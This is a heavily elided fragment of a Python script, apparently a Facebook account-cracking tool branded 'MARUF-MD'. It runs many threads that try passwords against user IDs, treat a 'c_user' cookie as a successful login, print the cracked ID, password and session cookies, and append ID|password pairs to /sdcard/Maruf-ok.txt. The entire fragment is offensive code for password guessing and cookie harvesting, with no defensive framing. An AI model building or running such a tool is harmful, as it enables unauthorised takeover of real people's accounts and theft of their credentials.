...
def sykology():
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mMaruf-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[MARUF-MD] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[MARUF-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/Maruf-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
